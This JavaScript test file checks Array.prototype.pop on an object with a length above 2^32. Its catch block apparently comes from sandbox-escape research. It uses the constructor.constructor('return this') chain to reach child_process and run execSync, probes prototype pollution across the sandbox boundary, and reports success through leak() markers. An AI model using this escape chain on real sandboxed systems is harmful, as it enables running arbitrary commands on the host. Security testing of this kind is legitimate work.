try {
    var obj = {};
    obj.pop = Array.prototype.pop;
    obj[0] = 'x';
    obj[4294967296] = 'y';
    obj.length = 4294967297;
    var pop = obj.pop();
    if (pop !== 'y') {
        $ERROR('#1: var obj = {}; obj.pop = Array.prototype.pop; obj[0] = "x"; obj[4294967296] = "y"; obj.length = 4294967297; obj.pop() === "y". Actual: ' + pop);
    }
    if (obj.length !== 4294967296) {
        $ERROR('#2: var obj = {}; obj.pop = Array.prototype.pop; obj[0] = "x"; obj[4294967296] = "y"; obj.length = 4294967297; obj.pop(); obj.length === 4294967296. Actual: ' + obj.length);
    }
    if (obj[0] !== 'x') {
        $ERROR('#3: var obj = {}; obj.pop = Array.prototype.pop; obj[0] = "x"; obj[4294967296] = "y"; obj.length = 4294967297; obj.pop(); obj[0] === "x". Actual: ' + obj[0]);
    }
    if (obj[4294967296] !== undefined) {
        $ERROR('#4: var obj = {}; obj.pop = Array.prototype.pop; obj[0] = "x"; obj[4294967296] = "y"; obj.length = 4294967297; obj.pop(); obj[4294967296] === undefined. Actual: ' + obj[4294967296]);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}